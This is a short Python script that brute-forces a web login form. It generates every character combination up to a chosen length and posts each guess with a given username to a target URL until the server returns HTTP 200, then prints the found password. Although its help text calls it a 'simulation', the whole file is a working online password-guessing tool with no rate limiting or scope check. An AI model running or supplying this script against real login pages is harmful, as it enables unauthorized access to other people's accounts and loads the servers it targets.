import argparse
import itertools
import requests

def generate_passwords(chars, max_length):
    """Generate passwords up to the specified max_length using the given chars."""
    for length in range(1, max_length + 1):
        for password_tuple in itertools.product(chars, repeat=length):
            yield ''.join(password_tuple)

def attempt_login(url, username, password):
    """Attempt to login with the given username and password."""
    try:
        # Adjust with the actual logic for making a login attempt.
        response = requests.post(url, json={'username': username, 'password': password})
        print(f"Attempting login with {username} and password: {password}")
        return response.status_code == 200
    except requests.RequestException as e:
        # Handle exceptions raised by the requests library, such as connection errors.
        print(f"Failed to make a request: {e}")
        raise  # Reraise the exception to signal that the script should stop due to this error.

def main():
    parser = argparse.ArgumentParser(description="Brute-force attack simulation.")
    parser.add_argument("--url", required=True, help="Login URL")
    parser.add_argument("--user", required=True, help="Username for login")
    parser.add_argument("--max-length", type=int, required=True, help="Max length of password to generate")
    parser.add_argument("--chars", required=True, help="Characters to use for generating passwords")
    args = parser.parse_args()

    try:
        for password in generate_passwords(args.chars, args.max_length):
            if attempt_login(args.url, args.user, password):
                print(f"Success! Password found: {password}")
                break
        else:
            print("Password not found within the given constraints.")
    except Exception as e:
        # If any exception is caught, print an error message and exit the script.
        print(f"Script failed due to an error: {e}")

if __name__ == "__main__":
    main()
